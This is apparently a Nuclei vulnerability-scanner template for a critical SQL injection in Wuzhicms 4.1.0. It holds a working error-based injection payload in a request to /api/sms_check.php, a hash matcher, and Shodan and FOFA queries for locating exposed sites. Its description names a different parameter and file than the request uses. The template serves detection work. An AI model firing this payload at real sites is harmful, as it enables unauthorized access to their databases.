id: wuzhicms-sqli
info:
  name: Wuzhicms 4.1.0 - SQL Injection
  author: princechaddha
  severity: critical
  description: Wuzhicms 4.1.0 is vulnerable to SQL injection via the grouppid parameter,
    allowing attackers to access sensitive data, modify information, and perform unauthorized
    administrative actions.
  reference:
  - https://github.com/wuzhicms/wuzhicms/issues/184
  - https://vulners.com/cnvd/CNVD-2022-36985
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-89
  metadata:
    verified: true
    shodan-query: http.html:"Wuzhicms"
    fofa-query: title="Wuzhicms"
    impact: The SQL injection vulnerability in Wuzhicms 4.1.0 can allow an attacker
      to gain unauthorized access and manipulate sensitive data in the affected site's
      database.
    recommendation: It is recommended to update Wuzhicms to version 4.1.1 or higher
      to address the SQL injection vulnerability in /coreframe/app/member/admin/group.php.
  tags: wuzhicms,sqli
variables:
  num: '999999999'
requests:
- method: GET
  path:
  - '{{BaseURL}}/api/sms_check.php?param=1%27%20and%20updatexml(1,concat(0x7e,(SELECT%20md5({{num}})),0x7e),1)--%20'
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - c8c605999f3d8352d7bb792cf3fdb25
  - type: status
    status:
    - 200
